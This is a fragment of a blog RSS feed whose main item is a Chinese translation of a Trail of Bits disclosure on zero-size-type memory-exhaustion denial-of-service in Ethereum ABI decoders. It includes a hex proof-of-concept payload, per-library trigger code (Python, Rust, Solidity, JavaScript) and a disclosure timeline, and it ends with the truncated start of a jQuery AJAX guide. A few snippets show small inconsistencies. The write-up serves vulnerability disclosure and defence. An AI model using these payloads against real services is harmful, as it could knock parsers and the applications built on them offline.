        <guid>http://localhost:1313/p/%E4%BA%BF%E6%AC%A1%E7%A9%BA%E8%80%97%E4%BB%A5%E5%A4%AA%E5%9D%8Aabi%E8%A7%A3%E6%9E%90%E5%99%A8%E4%B8%AD%E7%9A%84%E9%9B%B6%E5%A4%A7%E5%B0%8F%E7%B1%BB%E5%9E%8Bdos%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;亿次空耗---the-trail-of-bits博客&#34;&gt;亿次空耗 - The Trail of Bits博客
&lt;/h1&gt;&lt;p&gt;在以太坊强大的区块链技术背后，隐藏着一个开发者们较少提及的挑战：编写健壮的以太坊ABI（应用二进制接口）解析器的复杂性。以太坊ABI对区块链基础设施至关重要，它实现了智能合约与外部应用间的无缝交互。数据类型的复杂性和编解码的精确需求使得ABI解析充满挑战。规范或实现中的模糊性可能导致危及用户的漏洞。&lt;/p&gt;
&lt;p&gt;本文将深入剖析一个新型漏洞，该漏洞针对这些解析器，令人联想到曾肆虐XML领域的&amp;quot;十亿大笑&amp;quot;攻击。我们发现以太坊ABI规范部分条款表述松散，导致多个实现存在可利用漏洞，包括eth_abi(Python)、ethabi(Rust)、alloy-rs和ethereumjs-abi等库，可能引发拒绝服务(DoS)攻击。截至发文时，仅Python库已完成修复。&lt;/p&gt;
&lt;h2 id=&#34;什么是以太坊abi&#34;&gt;什么是以太坊ABI？
&lt;/h2&gt;&lt;p&gt;当链上合约交互或链下组件与合约通信时，以太坊使用ABI编码来处理请求和响应。这种编码方式不自我描述，编解码器需要提供定义数据类型的模式。与C语言中平台相关的ABI不同，以太坊规范了应用间二进制数据的传递方式。虽然规范尚未正式化，但清晰展现了数据交换机制。&lt;/p&gt;
&lt;p&gt;当前规范存在于Solidity文档中，其类型定义影响了Solidity和Vyper等智能合约语言。&lt;/p&gt;
&lt;h2 id=&#34;漏洞原理&#34;&gt;漏洞原理
&lt;/h2&gt;&lt;p&gt;零大小类型(ZST)指在磁盘存储中占零（或极小）字节，但加载到内存后需要显著更多空间的数据类型。以太坊ABI允许ZST存在，攻击者可利用其特性，通过极小量的磁盘或网络数据诱发巨大的内存分配。&lt;/p&gt;
&lt;p&gt;考虑以下场景：当解析器遇到ZST数组时会发生什么？它会尝试解析数组声明包含的所有ZST元素。由于每个元素占零字节，定义超大型ZST数组轻而易举。&lt;/p&gt;
&lt;p&gt;示例显示：20字节的磁盘数据可反序列化为包含数字2、1、3的数组；而仅8字节的数据却能反序列化为2³²个ZST元素（如空元组或空数组）。如果每个ZST在解析后仍占零字节内存，这不成问题。但实践中，每个元素通常需要少量非零内存，导致整体数组需要巨大内存分配，形成DoS攻击。&lt;/p&gt;
&lt;h2 id=&#34;概念验证&#34;&gt;概念验证
&lt;/h2&gt;&lt;p&gt;我们通过以下十六进制数据载荷演示多个库中的漏洞：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0000000000000000000000000000000000000000000000000000000000000020
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000000000000000000000000000000000000000000000000000000FFFFFFFF
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该载荷包含两个32字节块，描述序列化的ZST数组。第一块定义数组元素偏移量，第二块定义数组长度。我们使用&lt;code&gt;()[ ]&lt;/code&gt;和&lt;code&gt;uint32[0][]&lt;/code&gt;两种ABI模式进行解码测试。&lt;/p&gt;
&lt;h3 id=&#34;eth_abi-python&#34;&gt;eth_abi (Python)
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;eth_abi&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytearray&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fromhex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;()[]&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;4.2.0版本前的官方库会先挂起，最终因内存不足终止。&lt;/p&gt;
&lt;h3 id=&#34;ethabi-rust&#34;&gt;ethabi (Rust)
&lt;/h3&gt;&lt;p&gt;v18.0.0版本可通过CLI直接触发漏洞：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cargo run -- decode params -t &lt;span class=&#34;s2&#34;&gt;&amp;#34;uint32[0][]&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$payload&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;ethers-rs-rust&#34;&gt;ethers-rs (Rust)
&lt;/h3&gt;&lt;p&gt;v2.0.10版本通过&lt;code&gt;Vec&amp;lt;[u32; 0]&amp;gt;&lt;/code&gt;类型隐式使用漏洞模式：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ethers&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;abi&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;AbiEncode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hex&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Vec&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;u32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hex_output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unwrap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unwrap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;foundry-rust&#34;&gt;foundry (Rust)
&lt;/h3&gt;&lt;p&gt;该工具集基于ethers-rs，同样存在漏洞。可通过CLI或部署恶意合约触发：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;contract&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;ABC&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;fallback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;external&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kt&#34;&gt;bytes&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;memory&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;abi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xfffffffff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;assembly&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nf&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;mload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;alloy-rs&#34;&gt;alloy-rs
&lt;/h3&gt;&lt;p&gt;0.4.2版本的动态ABI解析同样存在挂起问题：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;alloy_dyn_abi&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DynSolType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DynSolValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;my_type&lt;/span&gt;: &lt;span class=&#34;nc&#34;&gt;DynSolType&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;()[]&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unwrap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decoded&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;my_type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;abi_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hex&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;$payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unwrap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unwrap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;ethereumjs-abi&#34;&gt;ethereumjs-abi
&lt;/h3&gt;&lt;p&gt;0.6.8版本的JavaScript实现也受影响：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;abi&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ethereumjs-abi&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;$payload&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;, &amp;#34;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;abi.rawDecode([ &amp;#34;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;uint32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;漏洞发现与利用&#34;&gt;漏洞发现与利用
&lt;/h2&gt;&lt;p&gt;该漏洞的发现源于对borsh-rs库中类似问题的研究。最新版Solidity和Vyper已禁止ZST定义，因此难以在主网部署触发此漏洞的智能合约。但任何使用受影响库解析不可信ABI声明的应用（如Etherscan）都可能面临风险。&lt;/p&gt;
&lt;h2 id=&#34;协调披露&#34;&gt;协调披露
&lt;/h2&gt;&lt;p&gt;我们遵循以下时间线进行披露：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2023年6月30日：首次联系各库维护者&lt;/li&gt;
&lt;li&gt;2023年8月2日：为eth_abi创建GitHub安全公告&lt;/li&gt;
&lt;li&gt;2023年8月31日：eth_abi发布无公开说明的修复&lt;/li&gt;
&lt;li&gt;2023年12月29日：公开发布分析报告并创建GitHub问题&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;建议开发者通过模糊测试强化解码器安全性，我们正将相关测试用例纳入OSS-fuzz持续检测体系。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>深入掌握jQuery AJAX：异步HTTP请求完全指南</title>
        <link>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E6%8E%8C%E6%8F%A1jquery-ajax%E5%BC%82%E6%AD%A5http%E8%AF%B7%E6%B1%82%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sat, 02 Aug 2025 09:45:01 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E6%8E%8C%E6%8F%A1jquery-ajax%E5%BC%82%E6%AD%A5http%E8%AF%B7%E6%B1%82%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;深入掌握jquery-ajax异步http请求完全指南&#34;&gt;深入掌握jQuery AJAX：异步HTTP请求完全指南
&lt;/h1&gt;&lt;h2 id=&#34;核心要点&#34;&gt;核心要点
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;多功能与精准控制&lt;/strong&gt;：jQuery的&lt;code&gt;$.ajax()&lt;/code&gt;函数提供了灵活强大的异步HTTP请求能力，支持自定义请求头、错误处理、超时设置等高级配置&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;全面配置选项&lt;/strong&gt;：超过30个可配置参数，涵盖从请求发送到响应处理的完整生命周期控制&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;现代开发中的价值&lt;/strong&gt;：尽管存在Fetch API等替代方案，&lt;code&gt;$.ajax()&lt;/code&gt;在维护旧代码库方面仍有不可替代的作用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;高级错误处理&lt;/strong&gt;：支持指数退避重试机制和全局错误处理，提升应用健壮性&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ajax函数详解&#34;&gt;&lt;code&gt;$.ajax()&lt;/code&gt;函数详解
&lt;/h2&gt;&lt;p&gt;jQuery的&lt;code&gt;$.ajax()&lt;/code&gt;函数用于执行异步HTTP请求，自jQuery 1.0版本就已存在。它是&lt;code&gt;$.get()&lt;/code&gt;、&lt;code&gt;$.post()&lt;/code&gt;等快捷方法的基础实现。&lt;/p&gt;
&lt;p&gt;函数签名：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ajax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
